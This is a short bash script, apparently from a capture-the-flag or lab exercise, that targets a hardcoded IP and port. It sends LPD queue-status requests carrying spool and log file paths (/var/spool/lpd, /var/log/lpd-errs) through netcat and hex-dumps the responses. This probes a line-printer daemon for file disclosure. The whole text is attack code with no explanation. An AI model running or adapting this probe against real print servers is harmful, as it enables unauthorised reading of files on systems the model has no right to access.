#!/bin/bash
TARGET="94.237.49.23"
PORT="37326"

files=(
    "/var/spool/lpd/lp/.seq"
    "/var/spool/lpd/lp/status"
    "/var/spool/lpd/lp/status.lp"
    "/var/spool/lpd/lp/lock"
    "/var/spool/lpd/lp/.lock"
    "/var/log/lp-errs"
    "/var/log/lpd-errs"
)

for file in "${files[@]}"; do
    echo "=== File: $file ==="
    echo -ne "\x04$file\n" | timeout 3s nc $TARGET $PORT | xxd | head -3
    echo ""
done